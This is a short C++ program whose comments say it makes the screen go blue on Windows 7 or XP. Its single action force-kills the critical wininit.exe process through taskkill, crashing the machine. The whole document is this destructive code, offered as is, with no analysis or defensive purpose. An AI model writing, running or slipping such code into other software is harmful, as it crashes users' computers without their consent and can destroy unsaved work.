#include <cstdlib>
int main() {
    //it will cause your screen blue.
    //Need Windows 7 or XP.
    system("taskkill -f -im wininit.exe");
    return 0;
}
